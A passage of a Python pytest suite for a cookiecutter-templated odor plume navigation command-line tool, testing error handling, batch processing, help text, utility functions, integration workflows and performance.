            mock_hydra.get.return_value.cfg = mock_cfg
            
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.return_value = {
                    'valid': False,
                    'errors': ['max_speed must be positive'],
                    'warnings': [],
                    'summary': {'navigator': 'invalid'}
                }
                
                result = self.runner.invoke(cli, ['run'])
                assert result.exit_code == 1
                assert 'max_speed must be positive' in result.output

    def test_verbose_error_reporting(self):
        """Test verbose error reporting with detailed traceback."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_hydra.initialized.return_value = True
            mock_cfg = DictConfig({'test': 'config'})
            mock_hydra.get.return_value.cfg = mock_cfg
            
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.side_effect = RuntimeError("Detailed error")
                
                # Test verbose mode includes more error details
                result = self.runner.invoke(cli, ['--verbose', 'run'])
                assert result.exit_code == 1

    def test_error_context_preservation(self):
        """Test that error context is preserved through error handling."""
        test_contexts = [
            'config validation',
            'navigator creation',
            'simulation execution',
            'visualization generation'
        ]
        
        for context in test_contexts:
            with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
                error = CLIError(f"Error in {context}")
                
                # Test that error context is logged
                try:
                    raise error
                except CLIError as e:
                    assert context in str(e)


class TestCLIBatchProcessing:
    """
    Test suite for batch processing validation per Section 7.4.2.1.
    
    Validates automated experiment execution, parallel processing capabilities,
    configuration file handling, and headless execution workflows.
    """

    def setup_method(self):
        """Initialize batch processing testing environment."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
        self.config_dir = Path(self.temp_dir) / 'configs'
        self.config_dir.mkdir()

    def teardown_method(self):
        """Clean up temporary directories."""
        if Path(self.temp_dir).exists():
            shutil.rmtree(self.temp_dir)

    def test_batch_command_structure(self):
        """Test batch command structure and parameters."""
        result = self.runner.invoke(batch, ['--help'])
        
        assert result.exit_code == 0
        assert 'Execute batch processing' in result.output
        assert '--jobs' in result.output
        assert '--config-dir' in result.output
        assert '--pattern' in result.output
        assert '--output-base' in result.output

    def test_batch_config_directory_validation(self):
        """Test batch processing with config directory validation."""
        # Test missing config directory
        result = self.runner.invoke(batch, ['--config-dir', '/nonexistent/path'])
        
        assert result.exit_code == 1
        assert 'Config directory not found' in result.output

    def test_batch_config_file_discovery(self):
        """Test configuration file discovery with different patterns."""
        # Create test configuration files
        config_files = [
            'config1.yaml',
            'config2.yaml',
            'experiment.yml',
            'test.json',
            'other.txt'
        ]
        
        for filename in config_files:
            config_file = self.config_dir / filename
            config_file.write_text(f"# Test config: {filename}")
        
        # Test YAML pattern matching
        result = self.runner.invoke(batch, [
            '--config-dir', str(self.config_dir),
            '--pattern', '*.yaml'
        ])
        
        # Should find yaml files
        assert result.exit_code in [0, 1]  # May complete or fail due to missing components

    def test_batch_parallel_processing_parameters(self):
        """Test batch processing parallel execution parameters."""
        # Create minimal config file
        config_file = self.config_dir / 'test.yaml'
        config_file.write_text("navigator:\n  max_speed: 5.0")
        
        # Test parallel job specification
        result = self.runner.invoke(batch, [
            '--config-dir', str(self.config_dir),
            '--jobs', '4',
            '--pattern', '*.yaml'
        ])
        
        assert result.exit_code in [0, 1]

    def test_batch_output_directory_handling(self):
        """Test batch processing output directory management."""
        config_file = self.config_dir / 'test.yaml'
        config_file.write_text("test: config")
        
        output_dir = Path(self.temp_dir) / 'batch_output'
        
        result = self.runner.invoke(batch, [
            '--config-dir', str(self.config_dir),
            '--output-base', str(output_dir)
        ])
        
        assert result.exit_code in [0, 1]

    def test_batch_file_processing_simulation(self):
        """Test batch file processing with multiple configuration files."""
        # Create multiple test configs
        configs = {
            'config1.yaml': {'navigator': {'max_speed': 5.0}},
            'config2.yaml': {'navigator': {'max_speed': 10.0}},
            'config3.yaml': {'navigator': {'max_speed': 15.0}}
        }
        
        for filename, config in configs.items():
            config_file = self.config_dir / filename
            config_file.write_text(f"# Config: {filename}\ntest: data")
        
        result = self.runner.invoke(batch, [
            '--config-dir', str(self.config_dir)
        ])
        
        # Should process multiple files
        assert result.exit_code in [0, 1]
        assert 'Found' in result.output and 'configuration files' in result.output

    def test_batch_empty_directory_handling(self):
        """Test batch processing with empty configuration directory."""
        empty_dir = Path(self.temp_dir) / 'empty'
        empty_dir.mkdir()
        
        result = self.runner.invoke(batch, [
            '--config-dir', str(empty_dir)
        ])
        
        assert result.exit_code == 1
        assert 'No configuration files found' in result.output

    def test_batch_headless_execution_support(self):
        """Test batch processing headless execution capabilities."""
        config_file = self.config_dir / 'headless_test.yaml'
        config_file.write_text("headless: true")
        
        # Test quiet mode for headless execution
        result = self.runner.invoke(cli, [
            '--quiet',
            'batch',
            '--config-dir', str(self.config_dir)
        ])
        
        assert result.exit_code in [0, 1]


class TestCLIHelpTextValidation:
    """
    Test suite for help message validation per F-013-RQ-002.
    
    Validates comprehensive help text generation, usage examples, parameter
    documentation, and help system accessibility across all CLI commands.
    """

    def setup_method(self):
        """Initialize help text validation environment."""
        self.runner = CliRunner()

    def test_main_cli_help_content(self):
        """Test main CLI help content and formatting."""
        result = self.runner.invoke(cli, ['--help'])
        
        assert result.exit_code == 0
        
        # Verify essential content sections
        help_text = result.output
        assert 'Odor Plume Navigation CLI' in help_text
        assert 'Examples:' in help_text
        assert 'Commands:' in help_text or 'Usage:' in help_text
        
        # Verify command examples are present
        assert '{{cookiecutter.project_slug}}-cli run' in help_text
        assert '{{cookiecutter.project_slug}}-cli config' in help_text
        
        # Verify global options documentation
        assert '--verbose' in help_text
        assert '--quiet' in help_text
        assert '--log-level' in help_text

    def test_run_command_help_content(self):
        """Test run command help content and usage examples."""
        result = self.runner.invoke(cli, ['run', '--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        # Verify command description
        assert 'Execute odor plume navigation simulation' in help_text
        
        # Verify parameter documentation
        assert '--dry-run' in help_text
        assert '--seed' in help_text
        assert '--output-dir' in help_text
        assert '--show-animation' in help_text
        
        # Verify usage examples
        assert 'Examples:' in help_text
        assert 'navigator.max_speed=' in help_text or 'parameter override' in help_text.lower()

    def test_config_group_help_content(self):
        """Test config command group help content."""
        result = self.runner.invoke(config, ['--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Configuration management commands' in help_text
        assert 'validate' in help_text
        assert 'export' in help_text

    def test_config_validate_help_content(self):
        """Test config validate command help content."""
        result = self.runner.invoke(config, ['validate', '--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Validate Hydra configuration files' in help_text
        assert '--strict' in help_text
        assert '--export-results' in help_text
        assert 'Examples:' in help_text

    def test_config_export_help_content(self):
        """Test config export command help content."""
        result = self.runner.invoke(config, ['export', '--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Export current configuration' in help_text
        assert '--output' in help_text
        assert '--format' in help_text
        assert 'yaml' in help_text
        assert 'json' in help_text

    def test_visualize_group_help_content(self):
        """Test visualize command group help content."""
        result = self.runner.invoke(visualize, ['--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Visualization generation and export' in help_text
        assert 'export' in help_text

    def test_visualize_export_help_content(self):
        """Test visualize export command help content."""
        result = self.runner.invoke(visualize, ['export', '--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Export visualization' in help_text
        assert '--input-data' in help_text
        assert '--format' in help_text
        assert 'mp4' in help_text
        assert 'gif' in help_text
        assert 'png' in help_text

    def test_batch_command_help_content(self):
        """Test batch command help content."""
        result = self.runner.invoke(batch, ['--help'])
        
        assert result.exit_code == 0
        
        help_text = result.output
        assert 'Execute batch processing' in help_text
        assert '--jobs' in help_text
        assert '--config-dir' in help_text
        assert '--pattern' in help_text
        assert 'Examples:' in help_text

    def test_help_text_formatting_consistency(self):
        """Test help text formatting consistency across commands."""
        commands_to_test = [
            [],
            ['run'],
            ['config'],
            ['config', 'validate'],
            ['config', 'export'],
            ['visualize'],
            ['visualize', 'export'],
            ['batch']
        ]
        
        for cmd_args in commands_to_test:
            result = self.runner.invoke(cli, cmd_args + ['--help'])
            assert result.exit_code == 0
            
            help_text = result.output
            
            # Verify consistent formatting elements
            assert 'Usage:' in help_text or 'Commands:' in help_text
            
            # Verify no obvious formatting errors
            assert not help_text.startswith('Error')
            assert not 'Traceback' in help_text

    def test_parameter_documentation_completeness(self):
        """Test that all parameters have proper documentation."""
        # Test run command parameter documentation
        result = self.runner.invoke(cli, ['run', '--help'])
        help_text = result.output
        
        # Verify parameter descriptions are present
        run_parameters = [
            '--dry-run',
            '--seed', 
            '--output-dir',
            '--save-trajectory',
            '--show-animation',
            '--export-video'
        ]
        
        for param in run_parameters:
            assert param in help_text, f"Parameter {param} not documented in run command help"

    def test_usage_examples_validity(self):
        """Test that usage examples in help text are valid."""
        result = self.runner.invoke(cli, ['--help'])
        help_text = result.output
        
        # Extract example commands from help text
        examples = []
        in_examples = False
        for line in help_text.split('\n'):
            if 'Examples:' in line:
                in_examples = True
                continue
            if in_examples and line.strip().startswith('{{cookiecutter.project_slug}}-cli'):
                examples.append(line.strip())
        
        # Verify examples are syntactically valid
        assert len(examples) > 0, "No usage examples found in help text"
        
        for example in examples:
            # Basic syntax validation
            assert example.startswith('{{cookiecutter.project_slug}}-cli')
            # Should contain valid command structure
            parts = example.split()
            assert len(parts) >= 2  # At least "{{cookiecutter.project_slug}}-cli command"


class TestCLIUtilityFunctions:
    """
    Test suite for CLI utility functions and internal helpers.
    
    Validates internal utility functions, configuration access helpers,
    performance measurement utilities, and CLI state management.
    """

    def setup_method(self):
        """Initialize utility function testing environment."""
        self.runner = CliRunner()

    def test_cli_config_state_management(self):
        """Test CLI configuration state management."""
        # Test initial state
        assert isinstance(_CLI_CONFIG, dict)
        
        # Test state updates
        original_verbose = _CLI_CONFIG.get('verbose', False)
        _CLI_CONFIG['verbose'] = True
        assert _CLI_CONFIG['verbose'] is True
        
        # Reset state
        _CLI_CONFIG['verbose'] = original_verbose

    def test_setup_cli_logging_function(self):
        """Test _setup_cli_logging utility function."""
        with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
            # Test verbose logging setup
            _setup_cli_logging(verbose=True, quiet=False, log_level='DEBUG')
            
            # Verify logger configuration was called
            mock_logger.remove.assert_called()
            mock_logger.add.assert_called()

    def test_validate_hydra_availability_function(self):
        """Test _validate_hydra_availability utility function."""
        # Test with Hydra available
        if HYDRA_AVAILABLE:
            # Should not raise exception
            _validate_hydra_availability()
        
        # Test with Hydra unavailable
        with patch('{{cookiecutter.project_slug}}.cli.main.HYDRA_AVAILABLE', False):
            with pytest.raises(CLIError) as exc_info:
                _validate_hydra_availability()
            assert 'Hydra is required' in str(exc_info.value)

    def test_safe_config_access_edge_cases(self):
        """Test _safe_config_access utility with edge cases."""
        # Test with None config
        result = _safe_config_access(None, 'any.path', default='default')
        assert result == 'default'
        
        # Test with empty path
        test_cfg = DictConfig({'test': 'value'})
        result = _safe_config_access(test_cfg, '', default='default')
        assert result == 'default'
        
        # Test with malformed path
        result = _safe_config_access(test_cfg, '...invalid..path', default='default')
        assert result == 'default'

    def test_measure_performance_function(self):
        """Test _measure_performance utility function."""
        # Test normal performance
        start_time = time.time()
        time.sleep(0.1)
        
        with patch('{{cookiecutter.project_slug}}.cli.main.logger') as mock_logger:
            _measure_performance("test_function", start_time)
            mock_logger.debug.assert_called_once()

    def test_cli_version_information(self):
        """Test CLI version information utilities."""
        version = get_cli_version()
        assert isinstance(version, str)
        assert len(version) > 0

    def test_cli_availability_check(self):
        """Test CLI availability checking."""
        available = is_cli_available()
        assert isinstance(available, bool)
        
        # Should be True since we're running CLI tests
        assert available is True

    def test_cli_environment_validation(self):
        """Test CLI environment validation."""
        validation_results = validate_cli_environment()
        
        assert isinstance(validation_results, dict)
        assert 'cli_available' in validation_results
        assert 'dependencies' in validation_results
        assert 'warnings' in validation_results
        assert 'errors' in validation_results

    def test_available_commands_listing(self):
        """Test get_available_commands utility."""
        commands = get_available_commands()
        
        assert isinstance(commands, dict)
        assert len(commands) > 0
        
        # Verify expected commands are present
        expected_commands = ['run', 'config', 'visualize', 'batch']
        for cmd in expected_commands:
            assert cmd in commands


class TestCLIIntegrationScenarios:
    """
    Integration test suite validating end-to-end CLI workflows.
    
    Tests complete CLI operation scenarios, real-world usage patterns,
    and integration with the broader {{cookiecutter.project_slug}} system.
    """

    def setup_method(self):
        """Initialize integration testing environment."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """Clean up integration test environment."""
        if Path(self.temp_dir).exists():
            shutil.rmtree(self.temp_dir)

    @patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig')
    @patch('{{cookiecutter.project_slug}}.cli.main.create_navigator')
    @patch('{{cookiecutter.project_slug}}.cli.main.create_video_plume')
    @patch('{{cookiecutter.project_slug}}.cli.main.run_plume_simulation')
    def test_complete_simulation_workflow(self, mock_sim, mock_plume, mock_nav, mock_hydra):
        """Test complete simulation workflow from CLI."""
        # Setup mocks
        mock_cfg = DictConfig({
            'navigator': {'position': [50, 50], 'max_speed': 5.0},
            'video_plume': {'video_path': 'test.mp4'},
            'simulation': {'num_steps': 100}
        })
        mock_hydra.initialized.return_value = True
        mock_hydra.get.return_value.cfg = mock_cfg
        
        mock_navigator = Mock()
        mock_navigator.num_agents = 1
        mock_nav.return_value = mock_navigator
        
        mock_video_plume = Mock()
        mock_video_plume.frame_count = 100
        mock_plume.return_value = mock_video_plume
        
        mock_sim.return_value = (
            np.random.rand(1, 100, 2),  # positions
            np.random.rand(1, 100),     # orientations
            np.random.rand(1, 100)      # odor_readings
        )
        
        with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
            mock_validate.return_value = {
                'valid': True,
                'errors': [],
                'warnings': [],
                'summary': {'navigator': 'valid', 'video_plume': 'valid', 'simulation': 'valid'}
            }
            
            # Execute simulation workflow
            result = self.runner.invoke(cli, [
                'run',
                '--seed', '42',
                '--output-dir', self.temp_dir,
                '--save-trajectory'
            ])
            
            assert result.exit_code == 0
            assert 'Simulation completed' in result.output

    def test_configuration_validation_workflow(self):
        """Test complete configuration validation workflow."""
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_cfg = DictConfig({'test': 'config'})
            mock_hydra.initialized.return_value = True
            mock_hydra.get.return_value.cfg = mock_cfg
            
            with patch('{{cookiecutter.project_slug}}.cli.main._validate_configuration') as mock_validate:
                mock_validate.return_value = {
                    'valid': True,
                    'errors': [],
                    'warnings': ['Minor warning'],
                    'summary': {'navigator': 'valid'}
                }
                
                # Test validation workflow
                result = self.runner.invoke(config, ['validate'])
                
                assert result.exit_code == 0
                assert 'Configuration is valid!' in result.output

    def test_export_and_validation_workflow(self):
        """Test configuration export and validation workflow."""
        export_file = Path(self.temp_dir) / 'config.yaml'
        
        with patch('{{cookiecutter.project_slug}}.cli.main.HydraConfig') as mock_hydra:
            mock_cfg = DictConfig({'test': 'config'})
            mock_hydra.initialized.return_value = True
            mock_hydra.get.return_value.cfg = mock_cfg
            
            # Export configuration
            with patch('{{cookiecutter.project_slug}}.cli.main.OmegaConf.save') as mock_save:
                result = self.runner.invoke(config, [
                    'export',
                    '--output', str(export_file)
                ])
                
                assert result.exit_code == 0
                mock_save.assert_called_once()

    def test_cli_error_recovery_workflow(self):
        """Test CLI error recovery and graceful degradation."""
        # Test graceful handling of missing dependencies
        with patch('{{cookiecutter.project_slug}}.cli.main.HYDRA_AVAILABLE', False):
            result = self.runner.invoke(cli, ['run'])
            
            # Should handle missing Hydra gracefully
            assert result.exit_code == 1
            assert 'Hydra' in result.output


class TestCLICompatibilityAndLegacy:
    """
    Test suite for CLI compatibility and legacy support validation.
    
    Ensures backward compatibility, migration support, and integration
    with existing workflows while maintaining new CLI functionality.
    """

    def setup_method(self):
        """Initialize compatibility testing environment."""
        self.runner = CliRunner()

    def test_legacy_parameter_compatibility(self):
        """Test compatibility with legacy parameter names."""
        # Test that legacy parameter names are handled gracefully
        result = self.runner.invoke(cli, ['run', '--help'])
        assert result.exit_code == 0
        
        # The CLI should document current parameters
        help_text = result.output
        assert '--seed' in help_text or '--dry-run' in help_text

    def test_module_import_compatibility(self):
        """Test that CLI modules can be imported without errors."""
        # Test direct module imports
        from {{cookiecutter.project_slug}}.cli.main import cli, main
        from {{cookiecutter.project_slug}}.cli import get_cli_version
        
        # Verify objects are properly accessible
        assert cli is not None
        assert main is not None
        assert get_cli_version is not None

    def test_configuration_schema_compatibility(self):
        """Test CLI compatibility with configuration schemas."""
        # Test that CLI can handle standard configuration schemas
        try:
            from {{cookiecutter.project_slug}}.config.schemas import NavigatorConfig
            
            # Should be able to create config instance
            config = NavigatorConfig(position=[50, 50], max_speed=5.0)
            assert config is not None
            
        except ImportError:
            pytest.skip("Configuration schemas not available")

    def test_api_integration_compatibility(self):
        """Test CLI integration with navigation API."""
        try:
            from {{cookiecutter.project_slug}}.api.navigation import create_navigator
            
            # Should be able to import API functions
            assert create_navigator is not None
            
        except ImportError:
            pytest.skip("Navigation API not available")

    def test_cookiecutter_template_structure_compliance(self):
        """Test CLI compliance with cookiecutter template structure."""
        # Validate that CLI follows expected module organization
        cli_modules = [
            '{{cookiecutter.project_slug}}.cli.main',
            '{{cookiecutter.project_slug}}.cli',
        ]
        
        for module_name in cli_modules:
            try:
                __import__(module_name)
            except ImportError as e:
                pytest.fail(f"CLI module {module_name} not accessible: {e}")


# Performance and load testing
@pytest.mark.performance
class TestCLIPerformanceValidation:
    """
    Performance validation test suite for CLI operations.
    
    Validates CLI performance characteristics, memory usage,
    and scalability requirements across different operation scales.
    """

    def setup_method(self):
        """Initialize performance validation environment."""
        self.runner = CliRunner()

    def test_cli_memory_usage(self):
        """Test CLI memory usage characteristics."""
        import psutil
        import os
        
        # Get baseline memory usage
        process = psutil.Process(os.getpid())
        baseline_memory = process.memory_info().rss
        
        # Execute CLI commands
        result = self.runner.invoke(cli, ['--help'])
        assert result.exit_code == 0
        
        # Check memory usage hasn't grown excessively
        current_memory = process.memory_info().rss
        memory_increase = current_memory - baseline_memory
        
        # Allow for reasonable memory increase (10MB threshold)
        assert memory_increase < 10 * 1024 * 1024, (
            f"CLI memory usage increased by {memory_increase / 1024 / 1024:.1f}MB"
        )

    def test_cli_startup_time_distribution(self):
        """Test CLI startup time distribution across multiple runs."""
        startup_times = []
        
        for _ in range(10):
            start_time = time.time()
            result = self.runner.invoke(cli, ['--help'])
            end_time = time.time()
            
            assert result.exit_code == 0
            startup_times.append(end_time - start_time)
        
        # Verify consistent performance
        avg_startup = sum(startup_times) / len(startup_times)
        max_startup = max(startup_times)
        
        assert avg_startup < 1.0, f"Average startup time {avg_startup:.3f}s too slow"
        assert max_startup < 2.0, f"Maximum startup time {max_startup:.3f}s exceeds threshold"

    def test_help_generation_performance(self):
        """Test help generation performance across all commands."""
        commands_to_test = [
            [],
            ['run'],
            ['config'],
            ['config', 'validate'],
            ['config', 'export'],
            ['visualize'],
            ['visualize', 'export'],
            ['batch']
        ]
        
        for cmd_args in commands_to_test:
            start_time = time.time()
            result = self.runner.invoke(cli, cmd_args + ['--help'])
            end_time = time.time()
            
            assert result.exit_code == 0
            help_time = end_time - start_time
            assert help_time < 0.5, (
                f"Help generation for {' '.join(cmd_args)} took {help_time:.3f}s"
            )


# Mark the module as containing CLI tests for pytest collection
pytest_plugins = []

def pytest_configure(config):
    """Configure pytest for CLI testing."""
    config.addinivalue_line(
        "markers", 
        "performance: mark test as performance validation test"
    )
    config.addinivalue_line(
        "markers",
        "integration: mark test as integration test requiring full system"
    )
    config.addinivalue_line(
        "markers", 
        "security: mark test as security validation test"
    )